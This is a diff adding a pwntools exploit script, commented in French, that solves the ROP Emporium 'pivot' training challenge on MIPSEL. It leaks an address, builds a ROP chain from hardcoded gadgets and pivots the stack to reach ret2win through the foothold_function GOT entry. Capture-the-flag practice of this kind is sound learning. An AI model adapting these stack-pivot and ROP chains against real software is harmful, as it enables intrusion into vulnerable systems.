@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+import time
+
+
+# ROPemporium pivot MIPSEL
+
+# Set up pwntools for the correct architecture
+elf = context.binary = ELF('pivot_mipsel')
+context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]
+
+# ret : 284
+gs='''
+b *pwnme+372
+c
+'''
+
+# References ELF du programme
+main=elf.symbols['main']
+useless_func=elf.symbols['uselessFunction']
+got_foothold=elf.got['foothold_function']
+plt_foothold=elf.plt['foothold_function']
+puts=elf.symbols['puts']
+pwnme=elf.symbols['pwnme']
+data = elf.get_section_by_name('.data').header['sh_addr']
+
+# References ELF de la librairie
+libelf = ELF('libpivot_mipsel.so')
+
+lib_foothold = libelf.symbols['foothold_function']
+lib_ret2win = libelf.symbols['ret2win']
+off_ret2win=lib_ret2win-lib_foothold
+
+
+# Gadgets
+# Read address to t1 and call
+# 0x00400cb0 : lw $t9, 8($sp) ; lw $t2, 4($sp) ; lw $t1, ($t2) ; jalr $t9 ; addiu $sp, $sp, 0xc
+g_read_addr_and_call = 0x00400cb0
+
+# Load t0 and call t9
+# 0x00400ca0 : lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc
+g_load_t0_and_call = 0x00400ca0
+
+# Call t0+t1
+# 0x00400cc4 : add $t9, $t0, $t1 ; jalr $t9 ; addiu $sp, $sp, 4
+g_call_t0t1 = 0x00400cc4
+
+# move sp, fp; lw ra, (sp+8); lw fp, (sp+4); jr ra; addiu sp, sp, 0xc
+g_pivot = 0x00400cd0
+
+
+
+if len(sys.argv)>1 and sys.argv[1] == "-d":
+    io = gdb.debug([elf.path],gdbscript=gs)
+else:
+    io = process([elf.path])
+
+
+bssaddr = elf.get_section_by_name('.bss').header['sh_addr']
+
+
+
+# Premier message
+# ETAPE 0 : lecture de l'adresse leak
+io.recvuntil(b"to pivot:")
+leak = io.recvline().rstrip()
+leak = int(leak,16)
+log.info(f"got_foothold   = 0x{got_foothold:x}")
+log.info(f"leak           = 0x{leak:x}")
+log.info(f"adr ret2win    = 0x{lib_ret2win:x}")
+log.info(f"adr foothold   = 0x{lib_foothold:x}")
+log.info(f"offset ret2win = 0x{off_ret2win:x}")
+log.info(f".bss address   = 0x{bssaddr=:x}")
+
+log.info("Message 1")
+# MESSAGE 1
+# ROP chaine d'exploitation
+
+# sp will be set to leak-4
+PL=p32(0xbbbbbbbb)         # junk
+PL+=p32(leak-0x200)          # pour fp
+PL+=p32(g_load_t0_and_call) # pour ra du gadget pivot
+# Call foothold
+PL+=p32(0xdeadbeef)         # junk
+PL+=p32(off_ret2win)        # t0 inutile ici
+PL+=p32(plt_foothold)       # pour t9
+
+# read got to t1
+PL+=p32(g_read_addr_and_call) # pour ra
+PL+=p32(got_foothold)       # 
+
+# load t0 with offset btw foothold and ret2win
+PL+=p32(g_load_t0_and_call) # next gadget
+PL+=p32(0xbbbbbbbb)         # junk
+PL+=p32(off_ret2win)        # offset 
+
+PL+=p32(g_call_t0t1)        # call (t0+t1)
+
+io.sendlineafter(b"> ",PL)
+
+log.info("ETAPE 1 / pivot")
+# MESSAGE 2 : pivot
+# Offset avant ecrasement de l'adresse de la sauvagarde de sp
+offset=0x20
+
+PL =b"A"*offset
+PL+=p32(leak)                 # Va dans fp
+# move sp, fp; lw ra, (sp+8); lw fp, (sp+4); jr ra; addiu sp, sp, 0xc
+PL+=p32(g_pivot)              # sp <= fp ; ra <= [leak+4]; fp <= [leak]; jr ra
+
+log.info(f"Payload size : 0x{len(PL):x}")
+log.info(PL.hex())
+io.sendlineafter(b"> ",PL)
+
+'''
+# This line is read by prio gadget
+PL+=p32(g_call_with_a0)    # t9 => next gadget for g_write_s1s0
+PL+=p32(0xdeadbeef)        # junk
+PL+=p32(print_file)        # t9 for g_call_with_a0
+PL+=p32(bssaddr)           # t0 for g_call_with_a0
+'''
+
+io.interactive()
+io.recvuntil(b"ROPE")
+flag=io.recvline().decode()
+log.success(f"flag : ROPE{flag}")
+io.close()
+
